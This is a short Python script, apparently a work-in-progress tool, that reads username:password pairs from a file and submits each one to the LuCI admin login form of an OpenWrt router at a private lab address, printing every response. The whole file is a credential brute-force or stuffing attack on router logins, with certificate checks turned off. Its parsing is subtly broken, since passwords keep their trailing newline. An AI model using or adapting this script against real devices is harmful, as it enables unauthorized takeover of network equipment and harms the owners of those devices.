import requests
import json

def parse_file():
    file = open("test.txt")
    credentialPairs = []
    for line in file:
        credentials = (line.split(":")) #Add option for user defined delimiter maybe?
        credentialPairs.append(credentials)
    return credentialPairs

def find_parameters():
    #This function needs a lot, so I'm hardcoding it for now
    parameters = ["luci_username","luci_password"]
    return parameters


def send_request(url, _data):
    _headers = {
"Content-Type": "application/x-www-form-urlencoded"
    }
    r = requests.post(url, data=_data, headers=_headers, verify=False, allow_redirects=True)
 
    return r


def craft_request(parameters, credentials):
    data = f"{parameters[0]}={credentials[0]}&{parameters[1]}={credentials[1]}"
    return data



creds = parse_file() # This returns an ARRAY of ARRAYS!!
params = find_parameters()
for pair in creds:
    _data = craft_request(params, pair)
    resp = send_request("https://192.168.56.110/cgi-bin/luci", _data)
    print(resp)
    print(resp.request.body)
    print(resp.request.url)
